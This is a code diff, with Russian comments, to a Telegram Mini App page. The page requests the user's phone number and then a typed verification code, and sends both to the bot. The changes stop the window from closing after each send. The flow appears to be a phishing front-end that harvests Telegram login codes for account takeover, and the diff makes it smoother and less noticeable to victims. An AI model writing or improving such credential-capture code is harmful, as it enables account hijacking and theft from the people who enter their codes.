@@ -65,27 +65,23 @@
                 tg.expand();
                 let isSent = false;
 
-                // 1. Запрос номера
+                // 1. Запрос номера (Отправляем в фоне, окно НЕ закрываем)
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared && contact) {
-                            // Отправляем номер
+                            // Отправляем данные
                             tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
                             
-                            // Переключаем экран ДО того, как окно закроется
+                            // Переключаем экран
                             document.getElementById('screen-phone').classList.add('hidden');
                             document.getElementById('screen-code').classList.remove('hidden');
                             
-                            // Так как sendData закрывает окно, нам нужно предотвратить это для первого шага,
-                            // но Telegram все равно закроет окно. Поэтому мы просто сразу открываем его снова через бота.
-                            setTimeout(() => { 
-                                document.getElementById('code-input').focus(); 
-                            }, 100);
+                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
                         }
                     });
                 };
 
-                // 2. Ввод кода
+                // 2. Ввод кода (Отправляем в фоне, окно НЕ закрываем)
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 const codeContainer = document.getElementById('code-cells');
@@ -116,11 +112,10 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                         
-                        // Отправляем код
+                        // Отправляем данные
                         tg.sendData(JSON.stringify({ type: "code", code: value }));
                         
-                        // Даем пользователю 1.5 секунды полюбоваться галочкой, затем закрываем
-                        setTimeout(() => { tg.close(); }, 1500);
+                        // НИКАКОГО tg.close()! Окно остается открытым.
                     }
                 });
             }
